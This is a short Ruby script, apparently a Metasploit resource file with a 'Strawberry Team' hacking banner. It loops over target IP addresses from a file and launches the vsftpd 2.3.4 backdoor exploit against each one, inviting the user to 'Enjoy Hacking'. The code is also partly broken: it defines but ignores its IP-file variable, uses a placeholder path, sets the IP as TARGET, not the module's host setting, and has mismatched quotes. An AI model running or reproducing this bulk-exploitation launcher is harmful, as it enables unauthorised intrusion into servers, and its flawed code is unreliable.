#!/usr/bin/ruby

puts "



███╗░░░███╗░██████╗███████╗██╗░░░██╗
████╗░████║██╔════╝██╔════╝██║░░░██║
██╔████╔██║╚█████╗░█████╗░░██║░░░██║
██║╚██╔╝██║░╚═══██╗██╔══╝░░██║░░░██║
██║░╚═╝░██║██████╔╝██║░░░░░╚██████╔╝
╚═╝░░░░░╚═╝╚═════╝░╚═╝░░░░░░╚═════╝░

Strawberry Team V0.1

Krd-Pentester


[+] Put The Target IP Address On A Text File    [+]
[+] Open Terminal Run msfconsole    			[+]
[+] Run msf resource cve_file_path  			[+]
[+] Enter And Enjoy Hacking                     [+]



==> The Powerful & Easyful Ruby Script For Running Msf Exploit By One-Command <==

								"""


ip_file = "Your_path_ip_txt_file"


File.open("path/to/file", "rb").each_line do |ip|
	print_status("Please be patient the strawberry will start against #{ip}")
	run_single("use exploit/unix/ftp/vsftpd_234_backdoor")
	run_single("show targets")
	run_single("set TARGET #{ip}")
	run_single("show options")
	run_single("run")
end


